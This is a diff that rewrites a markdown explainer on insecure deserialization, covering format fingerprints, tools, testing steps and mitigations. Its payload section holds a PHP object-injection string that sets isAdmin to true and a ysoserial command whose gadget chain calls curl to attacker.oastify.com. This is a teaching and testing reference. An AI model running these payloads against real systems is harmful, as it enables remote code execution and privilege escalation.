@@ -1,33 +1,62 @@
 # What is Insecure Deserialization?
-Insecure deserialization is a vulnerability that occurs when an application deserializes data from an untrusted or manipulated source without proper validation or sanitization. Deserialization is the process of converting serialized data (such as JSON or XML) back into objects or data structures that can be used by the application. Attackers exploit insecure deserialization vulnerabilities to execute arbitrary code, manipulate application logic, or gain unauthorized access to sensitive data.
 
-## How Does Insecure Deserialization Work?
-- Serialization: Serialization is the process of converting objects or data structures into a format that can be easily stored or transmitted, such as JSON, XML, or binary format.
+Insecure Deserialization is when an app takes serialized data from an untrusted source and rebuilds objects from it without validation. Because deserialization can trigger constructors, magic methods, and property setters, a crafted payload can hijack that process - leading to remote code execution, auth bypass, or object injection. It is hard to spot and often devastating.
 
-- Deserialization: Deserialization is the reverse process, where serialized data is converted back into objects or data structures that the application can understand and use.
+## How it works
 
-- Manipulation: Attackers manipulate serialized data or inject malicious payloads into serialized objects to exploit vulnerabilities in the deserialization process.
+- The app serializes objects to send/store them (cookies, tokens, caches, queues)
+- An attacker tampers with or forges the serialized blob
+- On deserialization, a "gadget chain" of existing classes is triggered to run code
 
-- Code Execution: When the application deserializes the manipulated data, the attacker's payload may be executed, leading to arbitrary code execution, remote code execution, or other security compromises.
+## Where to look
 
-## Example Scenario
-Imagine a web application that deserializes user-supplied data to reconstruct user preferences or settings. An attacker manipulates the serialized data to include malicious code or objects. When the application deserializes this data, the attacker's payload is executed, leading to unauthorized actions such as system compromise or data exfiltration.
+```text
+Java     -> base64 starting with "rO0" (0xAC 0xED stream header)
+PHP       -> serialize() output: O:4:"User":2:{...}
+Python    -> pickle streams (very dangerous by design)
+.NET      -> BinaryFormatter / ViewState
+Ruby       -> Marshal.load
+Node.js    -> node-serialize, funcster
+```
 
-## Impact of Insecure Deserialization
-- Arbitrary Code Execution: Attackers can execute arbitrary code on the server or client-side, leading to system compromise, data breaches, or service disruptions.
+## Payload examples
 
-- Data Tampering: Insecure deserialization can allow attackers to modify or tamper with serialized data, leading to data corruption, integrity violations, or unauthorized modifications.
+```php
+// PHP object injection - control properties to abuse a __wakeup/__destruct
+O:4:"User":2:{s:4:"name";s:5:"admin";s:7:"isAdmin";b:1;}
+```
 
-- Privilege Escalation: Attackers may exploit insecure deserialization to escalate privileges, gain unauthorized access to sensitive data, or bypass access controls within the application.
+```bash
+# Java - generate an RCE gadget chain with ysoserial
+java -jar ysoserial.jar CommonsCollections5 'curl attacker.oastify.com' | base64
+```
 
-## Mitigating Insecure Deserialization
-- Input Validation: Validate and sanitize serialized data before deserialization to ensure it comes from trusted sources and adheres to expected formats and structures.
+## Tools
 
-- Deserialization Controls: Implement controls such as whitelisting of allowed classes or objects, integrity checks, or signature verification to prevent execution of unauthorized or malicious code during deserialization.
+- [ysoserial](https://github.com/frohoff/ysoserial) - Java deserialization gadget chains
+- [ysoserial.net](https://github.com/pwntester/ysoserial.net) - .NET equivalent
+- [PHPGGC](https://github.com/ambionics/phpggc) - PHP gadget chain generator
+- [Burp - Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner)
 
-- Least Privilege Principle: Limit the privileges of deserialization processes to reduce the impact of potential exploitation and prevent unauthorized access to sensitive resources.
+## Manual testing
 
-- Security Testing: Conduct security assessments, code reviews, and penetration testing to identify and remediate insecure deserialization vulnerabilities in the application code.
+1. Identify serialized data in cookies, params, tokens, or uploads
+2. Fingerprint the format (magic bytes / structure above)
+3. Tamper with a field and watch for errors that reveal deserialization
+4. If a known library is in use, generate a gadget chain and test in scope with an OAST callback
 
-## Conclusion
-Insecure deserialization is a critical security vulnerability that can lead to arbitrary code execution, data tampering, and privilege escalation. By understanding how insecure deserialization works and implementing appropriate security measures such as input validation, deserialization controls, least privilege principle, and security testing, developers can mitigate the risk of exploitation and protect their applications from malicious attacks. Regular security audits and updates are essential for maintaining a secure deserialization process in software applications.
+## Mitigation
+
+- Do not deserialize untrusted data; prefer plain data formats like JSON with a schema
+- If you must, sign and verify serialized blobs (HMAC) before deserializing
+- Use allowlists of permitted classes; disable dangerous formatters (`BinaryFormatter`, `pickle`)
+- Keep libraries patched to remove known gadget chains
+
+## Deep dive
+
+- [Insecure Deserialization - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
+- [PortSwigger deserialization labs](https://portswigger.net/web-security/deserialization)
+
+## CWE
+
+- CWE-502: Deserialization of Untrusted Data
